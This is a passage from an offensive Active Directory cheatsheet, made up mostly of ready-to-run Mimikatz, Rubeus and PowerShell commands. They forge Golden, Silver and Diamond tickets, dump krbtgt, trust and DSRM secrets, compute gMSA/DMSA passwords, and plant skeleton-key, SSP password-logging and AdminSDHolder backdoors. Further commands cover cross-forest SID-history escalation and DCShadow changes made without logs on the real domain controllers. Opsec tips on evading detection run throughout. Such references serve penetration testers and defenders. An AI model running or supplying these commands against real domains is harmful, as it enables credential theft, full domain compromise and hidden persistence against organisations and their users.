.\Rubeus.exe diamond /krbkey:<aes_krbtgt_key> /user:user1 /password:password /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:Administrator /ticketuserid:<target_RID> /groups:512 /nowrap
```

For better opsec, the Shapphire Ticket presented in the Active Directory - Python edition cheatsheet can be used.

### Golden ticket

#### Retrieve the krbtgt hash

* From the DC by dumping LSA

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
```

* With a DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

#### Create TGT

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

#### RODC Golden Ticket

In case of a RODC, it is still possible to forge a Golden Ticket but the KRBTGT's version number is needed and only the accounts allowed to authenticate can be specified in the ticket (according to the `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` lists).

```powershell
.\Rubeus.exe golden /rodcNumber:<krbtgt_number> /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:<krbtgt_aes_key> /user:user1 /id:<user_RID> /domain:domain.local /sid:<domain_SID>
```

### Silver ticket

#### Create ST

`/rc4` take the service account (generally the machine account) hash. `/aes128` or `/aes256` can be used for AES keys.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:<target>.domain.local /service:CIFS /rc4:<account_hash> /ptt"'
```

Requesting a ST with a valid TGT can be performed with **Rubeus** like this:

```powershell
.\Rubeus.exe asktgs /ticket:tgt.kirbi /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt
```

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

```powershell
.\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/target.domain.local" /ticket:"<base64_target_TGT>" /nowrap
```

### GoldenGMSA

With the KDS root key and some information about the gMSA account (that can be retrieved with low privileges), it is possible to compute the gMSA's password.

#### Dump the KDS root key

This operation needs admin privs on the domain

```powershell
#For the root domain of the forest
./GoldenGMSA.exe kdsinfo

#For a specific domain
./GoldenGMSA.exe kdsinfo --forest domain.local
```

#### Retrieve gMSA's information

Low privs are sufficient here

```powershell
#All the gMSA accounts
./GoldenGMSA.exe gmsainfo

#A specific one in a specific domain
./GoldenGMSA.exe gmsainfo --sid <gmsa_SID> --domain domain.local
```

#### Compute the password

This operation can be realized offline

```powershell
./GoldenGMSA.exe compute --sid <gmsa_SID> --kdskey <base64_KDS_key> --pwdid <base64_msds-ManagedPasswordID_value>
```

The output is in Base64 and the password is generally not readable. It is possible to calcul the NT hash from it instead:

```python
import base64
import hashlib

b64 = "<base64_password>"
print(hashlib.new("md4", base64.b64decode(b64)).hexdigest())
```

### GoldenDMSA

This technique is very similar to GoldenGMSA, but targets new DMSA accounts in Windows Server 2025.

First, extract the Root Key:

```powershell
./GoldenDMSA.exe kds [--domain child.domain.local] #For a child domain
```

Then, enumerate the DMSA accounts:

```powershell
# From the root domain
./GoldenDMSA.exe info -d domain.local -m ldap

# From a child domain
./GoldenDMSA.exe info -u user1 -p password -o child.domain.local -d domain.local -m ldap
```

Generate a ManagedPasswordId wordlist:

```powershell
GoldenDMSA.exe wordlist -s <DMSA_SID> -d <DMSA_domain> -f domain.local -k <KDS_ROOT_KEY_ID>
```

And finally, bruteforce the `ManagedPasswordId` from the values found previously:

```powershell
GoldenDMSA.exe bruteforce -s <DMSA_SID> -u <DMSA_NAME$> -k <KDS_ROOT_KEY> -i <KDS_ROOT_KEY_ID> -d <DMSA_domain>
```

### Skeleton key

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc.domain.local
```

Now, it is possible to access any machine with a valid username and password as "mimikatz".

```powershell
Enter-PSSession -Computername dc -Credential domain\Administrator
```

### DSRM

* DSRM is Directory Services Restore Mode
* The local administrator on every DC can authenticate with the DSRM password
* It is possible to pass the hash of this user to access the DC after modifying the DC configuration

#### Dump DSRM password

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
```

#### Change registry configuration

Need to change the logon behavior before pass the hash

```powershell
Enter-PSSession -Computername dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Now the DSRM hash ca be used to authenticate

### Custom SSP

SSP are DDLs that provide ways to authenticate for the application. For example Kerberos, NTLM, WDigest, etc. Mimikatz provides a custom SSP that permits to log in a file in clear text the passwords of the users that authenticate on the machine.

* By patching LSASS (really instable since Server 2016)

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

* By modifying the LSA registry

Upload the `mimilib.dll` to **system32** and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` :

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

All local logons on the DC are logged to `C:\Windows\system32\kiwissp.log`

### DACLs - AdminSDHolder

AdminSDHolder is a solution that compares the ACLS of the objects with `AdminCount=1` with a list of ACLs. If the ACLs of the objects are different, they are overwritten. The script run normally every hour.

#### Attack

* With write privs on the AdminSDHolder object, it can be used for persistence by adding a user with Full Permissions to the AdminSDHolder object for example.
* When the automatic script will run, the user will be added with Full Control to the AC of groups like Domain Admins.

```powershell
#PowerView
Add-ObjectAcl -TargetSearchBase 'CN=AdminSDHolder,CN=System' -PrincipalIdentity user1 -Rights All -Verbose

#AD Module
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Principal user1 -Verbose
```

#### Run SDProp manually

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
#Pre-Server 2008
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check Domain Admins DACLs

```powershell
#PowerView
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}

#AD Module
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'user1'}
```

### DACLs - Interesting rights

The ACLs can be used for persistence purpose by adding interesting rights like DCSync, FullControl over the domain, etc. Check the `On any objects` in the ACLs attacks section. Multiple rights like **All**, **DCSync**, etc, are possible.

### DACLs - Security Decriptors

ACLs can be modified to allow users to access objects.

#### WMI

```powershell
#On local machine
Set-RemoteWMI -UserName user1 -Verbose

#On remote machine without explicit credentials
Set-RemoteWMI -UserName user1 -ComputerName <computer> -namespace 'root\cimv2' -Verbose

#On remote machine with explicit credentials. Only root\cimv2 and nested namespaces
Set-RemoteWMI -UserName user1 -ComputerName <computer> -Credential Administrator -namespace 'root\cimv2' -Verbose

#On remote machine remove permissions
Set-RemoteWMI -UserName user1 -ComputerName <computer> -namespace 'root\cimv2' -Remove -Verbose
```

#### PowerShell Remoting

```powershell
#On local machine
Set-RemotePSRemoting -UserName user1 -Verbose

#On remote machine without credentials
Set-RemotePSRemoting -UserName user1 -ComputerName <computer> -Verbose

#On remote machine, remove the permissions
Set-RemotePSRemoting -UserName user1 -ComputerName <computer> -Remove
```

#### Remote Registry

With the scripts from **DAMP-master**. Permits to realize some actions like credentials dump via the registry.

## Cross-Trust Movement

### Child to parent domain

Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the **Enterprise Admins** group in the SID history field.

#### With the trust key

Get the trust key, look at the `[in]` value in the result

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc
#OR
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\parentDomain$"'
```

Forge the referral ticket :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<enterprise_admins_SID>-<RID> /rc4:<key> /service:krbtgt /target:parentDomain.local /ticket:trust.kirbi"'
```

Request a ST with the previous TGT and access service :

```powershell
#New tools for more fun
.\asktgs.exe trust.kirbi CIFS/dc.parentDomain.local
.\kirbikator.exe lsa .\CIFS.dc.parentDomain.local.kirbi
ls \\dc.parentDomain.local\c$

#Or classicaly
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parentDomain.local /dc:dc.parentDomain.local /ptt
ls \\dc.parentDomain.local\c$
```

#### With the krbtgt hash

Exactly the same attack, but with the krbtgt hash that can be extracted like this :

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

To avoid some suspicious logs, use multiple values can be added in SID History :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:domain.local /sid:<current_domain_SID> /groups:516 /sids:<parent_domain_SID>-516,S-1-5-9 /krbtgt:<krbtgt_hash> /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:parentDomain\Administrator /domain:parentDomain.local"' 
```

* `<parent_domain_SID>-516` – Domain Controllers
* `S-1-5-9` – Enterprise Domain Controllers

### Across forest

#### SID History attacks

If there is no SID filtering, it is possible to specify any privileged SID of the target forest in the SID History field. Otherwise, with partial filtering, an **RID > 1000** must be indicated.

* Get the Trust Key

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
#Or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

* If **no filtering** : forge a referral ticket or an inter-realm Golden Ticket and request for a ST

```powershell
#Referral ticket with the Trust Key
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<target_domain_SID>-<RID> /rc4:<key> /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

#Inter-realm Golden Ticket with krbtgt, with pass-the-ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<target_domain_SID>-<RID> /krbtgt:<krbtgt_hash> /ptt"'

#For a specific user different than the Administrator (not RID 500)
Invoke-Mimikatz -Command '"kerberos::golden /user:user1 /domain:domain.local /sid:<current_domain_SID> /id:<user1_RID> /rc4:<trust_key> /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'

./Rubeus.exe asktgs /ticket:trust_forest.kirbi /service:cifs/dc.targetDomain.local /dc:dc.targetDomain.local /ptt
```

* If **there is SID filtering**, same thing as above but with **RID > 1000** (for example, Exchange related groups are sometimes highly privileged, and always with a RID > 1000). Otherwise, get the `foreignSecurityPrincipal`. These users of the current domain are also members of the trusting forest, and they can be members of interesting groups:

```powershell
#These SIDs are members of the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#The found SIDs can be search in the current forest
Get-DomainObject |? {$_.objectSid -match "<SID>"}
```

Then, it is possible to forge an referral ticket for this user and access the target forest with its privileges.

#### TGT delegation

By default, Domain Controllers are setup with Unconstrained Delegation (which is necessary in an Active Directory to correctly handle the Kerberos authentications).

If TGT delegation is **enabled** in the trust attributes, it is possible to coerce the remote Domain Controller authentication from the compromised Domain Controller, and retrieve its TGT in the ST. If TGT delegation is **disabled**, the TGT will not be added in the ST, even with the Unconstrained Delegation.

Additionally, **Selective Authentication must not be enabled** on the trust, and a two ways trust is needed.

How to exploit an [Unconstrained Delegation](/books/cheatsheets-82c/page/active-directory#bkmrk-unconstrained-delega-0).

#### Account Operators Replicating Trust Attack (AORTA)

Everything is explained [here](https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/).

1. The first step is to set up a Windows Server VM on our machine and promote it to a domain controller for its own forest (e.g. `attacker.local`).
2. On this VM, we need to create a _DNS Conditional Forwarder_ to be able to resolve the other forest through the trust:

```powershell
Add-DnsServerConditionalForwarderZone -Name <target_domain_fqdn> -MasterServers <target_DC_IP>
```

3. On our DC as Administrator, we create an outgoing approval relationship to the target forest:

```
Open Active Directory Domains and Trusts as Administrator on attackerdc
Right-click on "attacker.local", and click on "Properties"
Go to the "Trusts" tab, and click "New Trusts…"
Click "Next", type $TARGET_FOREST_FQDN and click "Next"
Select "Forest trust" and click "Next"
Select "One-way outgoing" and click "Next"
Select "This domain only" and click "Next"
Select "Forest-wide authentication" and click "Next"
Enter the trust password "$TRUST_PASS" twice and click "Next"
Click "Next", then "Next", then "Yes, confirm the outgoing trust", and "Next"
Click Finish
```

4. The next step is to log in **as an Account Operator** for the target domain on the DC you just created, and add yourself to the **Incoming Forest Trust Builders** and **DnsAdmins** groups in the target AD:

```powershell
runas /netonly /user:<operator_user>@<target_domain_fqdn> powershell

Add-ADGroupMember -Identity "Incoming Forest Trust Builders" -Members <operator_user>-Server <target_domain_fqdn>
Add-ADGroupMember -Identity "DnsAdmins" -Members <operator_user>-Server <target_domain_fqdn>
klist purge
```

5. Once in these groups, you can create an inbound trust, with TGT delegation enabled, on the target forest. This completes the trust relationship from the attacking forest to the target forest. Enabling TGT delegation requires the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` flag, which is no longer accessible by default. The [Trustify](https://github.com/bytewreck/Trustify) tool allows you to automate everything. Still as the operator account added to both groups:

```powershell
Trustify.exe create <target_domain_fqdn> <attacker_domain_sid> <attacker_forest_fqdn> <attacker_forest_netbios> <trust_pass>
Get-ADTrust <attacker_forest_fqdn> -Server <target_forest_fqdn>
```

6. As the operator account, create a _DNS Conditional Forwarder_ on the target forest, pointing to the attacking forest:

```powershell
Add-DnsServerConditionalForwarderZone -Name <attacker_forest_fqdn> -MasterServers <attacker_DC_IP> -ComputerName <target_DC_fqdn>
```

From there, everything is ready for coercion. In this scenario, there is no need for two-way approval since we will authenticate on the target DC with an account from its forest. We just need approval in the "attacker -> target" direction so that the target DC can _come_ to the "attacker".

We can now coerce the target DC towards our DC and perform a [Unconstrained Delegation](/books/cheatsheets-82c/page/active-directory#bkmrk-unconstrained-delega-0).

#### Transit across non-transitive trusts

If a **non-transitive** trust is setup between domains from two different forests (domain A and B for example), users from domain A will be able to access resources in domain B (in case that B trusts A), but will not be able to access resources in other domains that trust domain B (for example, domain C). Non-transitive trusts are setup by default on **External Trusts** for example.

However, there is a way to make non-transitive trusts transitive. Full explains [here](https://exploit.ph/external-trusts-are-evil.html).

For this example, there is an **External Trust** between domains A and B (which are in different forests), there is a **Within Forest** trust between domains B and C (which are in the same forest), and a **Parent-child** trust between domains C and D (so, they are in the same forest). We have a user (userA) in domain A, and we want to access services in domain D, which is normally impossible since **External Trusts** are non-transitive.

* First, obtain a TGT for userA in his **domain A**

```powershell
./Rubeus.exe asktgt /user:userA /password:password /nowrap
```

* Then, request a referral for the **domain B** with the previously obtained TGT (for the moment, everything is normal). This referral can be used to access resources in **domain B** as userA

```powershell
./Rubeus.exe asktgs /service:krbtgt/domainB.local /ticket:<previous_TGT> /dc:dc.domainA.local /nowrap
```

* With this referral, it is not possible to request for a ST in **domain C** since there is no transitivity. However, it is possible to use it to ask for a "local" TGT in domain B for userA. This will be a valid TGT in domain B and not a referral between A and B

```powershell
./Rubeus.exe asktgs /service:krbtgt/domainB.local /targetdomain:domainB.local /ticket:<previous_referral> /dc:dc.domainB.local /nowrap
```

* Now, this TGT can be reused to ask for a referral to access **domain C**, still from **domain A with user A**

```powershell
./Rubeus.exe asktgs /service:krbtgt/domainC.local /targetdomain:domainB.local /ticket:<previous_local_TGT> /dc:dc.domainB.local /nowrap
```

This referral for **domain C** can be, in turn, used to access **domain D** with the same technique, and so on. This attack permits to pivot between all the trusts (and consequently the domains) in the same forest from a domain in a external forest.

However, it is not possible to directly use this technique to access a domain in another forest that would have a trust with **domain D**. For example, if **domain D** has an **External Trust** with **domain E** in a third forest, it will be not possible to access domain E from A.

A valid workaround is to use the referral for domain D to request a ST for LDAP in domain D, and use it to create a machine account. This account will be valid in domain D and will be used to restart the attack from domain D (like with user A) and access domain E.

```powershell
./Rubeus.exe asktgs /service:ldap/domainD.local /ticket:<referral_domainD> /dc:dc.domainD.local /ptt
New-MachineAccount -MachineAccount machineDomainD -Domain domainD.local -DomainController dc.domainD.local
#Then, ask for a TGT and replay the attack against domain E
```

### Across forest - PAM trust

The goal is to compromise the **bastion** forest and pivot to the **production** forest to access to all the resources with a **Shadow Security Principal** mapped to a high priv group.

#### Check if the current forest is a bastion forest

* Enumerate trust properties

```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

* Enumerate shadow security principals

```powershell
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
```

* `Name` - Name of the shadow principal
* `member` - Members from the bastion forest which are mapped to the shadow principal
* `msDS-ShadowPrincipalSid` - The SID of the principal (user or group) in the user/production forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest

These users can access the production forest through the trust with classic workflow (PSRemoting, RDP, etc), or with `SIDHistory` injection since `SIDFiltering` is disabled in a **PAM Trust**.

#### Check if the current forest is managed by a bastion forest

```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True)}
```

A trust attribute of `1096` is for PAM (`0x00000400`) + External Trust (`0x00000040`) + Forest Transitive (`0x00000008`).

### SCCM Hierarchy takeover

In case an organisation has multiple SCCM primary sites dispersed between different domains, it has the possibility to setup a **Central Administration Site** to administrate all the sites from one "top" site server.

If it the case, by default the CAS will automatically replicate all the SCCM site admins between all the sites. This means, if you have takeover one site and added a controlled user as SCCM site admin, he will be automatically added as a site admin on all the other site by the CAS, and you can use him to pivote between the sites.

Full explains [here](https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-41929c61e087).

### MSSQL server

Everything is here. (*Not for the moment, refactor in progress*)

## Forest Persistence - DCShadow

* DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller
* The compromised machine must be in the **root domain** on the forest, and the command must be executed as DA (or similar)

The attack needs 2 instances on the compromised machine and **Mimikatz**.

* One to start RPC servers with SYSTEM privileges and specify attributes to be modified

```batch
#With Mimikatz
#Set SYSTEM privs to the process
!+
!processtoken
#Launch the server
lsadump::dcshadow /object:<object_to_modify> /attribute:<attribute_to_modify> /value=<value_to_set>
```

* And second with enough privileges (DA or otherwise) to push the values :

```batch
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /impersonate
lsadump::dcshadow /push
```

### Minimal permissions

DCShadow can be used with [minimal permissions](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#dcshadow) (and [this](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)) by modifying ACLs of :

* The domain object.
  * DS-Install-Replica (Add/Remove Replica in Domain)
  * DS-Replication-Manage-Topology (Manage Replication Topology)
  * DS-Replication-Synchronize (Replication Synchornization)
* The Sites object (and its children) in the Configuration container.
  * CreateChild and DeleteChild
* The object of the computer which is registered as a DC.
  * WriteProperty (Not Write)
* The target object.
  * WriteProperty (Not Write)

`Set-DCShadowPermissions` can be used to setup automatically

To use DCShadow as user **user1** to modify **user2** object from machine **machine-user1**

```powershell
Set-DCShadowPermissions -FakeDC machine-user1 -SAMAccountName user2 -Username user1 -Verbose
```

Now, the **second mimkatz** instance (which runs as DA) is not required.

### Set interesting attributes

#### Set SIDHistory to Enterprise Admin

```batch
lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:<domain_SID>-519
```

#### Modify primaryGroupID

```batch
lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
```

#### Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user

We just need to append a Full Control ACE from above for SY/BA/DA with our user's SID at the end.

```powershell
#Read the current ACL of high priv groups
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
```

Get the SID of our user and append it at the end of the ACLs. Then launch DCShadow like this :

```batch
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>
```

#### Set a SPN on an user

```batch
lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"
```

### Shadowception

We can even run DCShadow from DCShadow, which is [_Shadowception_](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#shadowception-give-dcshadow-permissions-using-dcshadow-no-modified-permissions-logs) (and [still this](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)).

We need to append following ACEs with our user's SID at the end:

* On the domain object: `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`\
  `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`\
  `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* On the attacker computer object: `(A;;WP;;;UserSID)`
* On the target user object: `(A;;WP;;;UserSID)`
* On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`

#### Get the ACLs

Get the ACLs for the Domain Object :

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl
```

For the attacker machine :

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=machine-user1,CN=Computers,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
```

For the target user :

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=user2,CN=Users,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
```

For the Site Container :

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
```

#### Stack the queries

After have get the ACLs and have appended the new ACEs for each one, we can stack the different queries to make a big DCShadow query\
For each one :

```batch
lsadump::dcshadow /stack /object:<object> /attribute:ntSecurityDescriptor /value:<newACL_after_the_append>
```

Then just `lsadump::dcshadow`

DCShadow can now be run from a user DCShadow-ed.

## References

* [The Hacker Recipes](https://www.thehacker.recipes)
* [Pentester Academy](https://www.pentesteracademy.com)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
* [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/)
* [Pentestlab.blog](https://pentestlab.blog/)
* [HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [Haax](https://cheatsheet.haax.fr/)
* [Red Teaming Experiments](https://www.ired.team)
* [NetExec wiki](https://www.netexec.wiki/)
* [Cube0x0](https://cube0x0.github.io)
* [Dirk-jan Mollema](https://dirkjanm.io)
* [Snovvcrash](https://ppn.snovvcrash.rocks)
* [Exploit.ph](https://exploit.ph/)
* [Adam Chester](https://blog.xpnsec.com/)
* [Olivier Lyak](https://medium.com/@oliverlyak)
* [Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [Masky release](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
* [Active Directory Spotlight](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/)
* [LDAP Pass back](https://www.acceis.fr/ldap-pass-back-attack/)
* [SOAPHound](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
* [ThievingFox](https://blog.slowerzs.net/posts/thievingfox/)
* [SpecterOps](https://posts.specterops.io)
* [MDSec](https://www.mdsec.co.uk/knowledge-centre/research/)
* [Semperis](https://www.semperis.com/fr/blog/)
* [Cogiceo](https://www.cogiceo.com/en/our-white-papers/)
* [Akamai Security Blog](https://www.akamai.com/blog/security-research)
* [BloodHound Legacy](https://bloodhound.readthedocs.io/en/latest/index.html) & [BloodHound CE](https://bloodhound.specterops.io/home)
* [Hack The Box](https://www.hackthebox.com/)
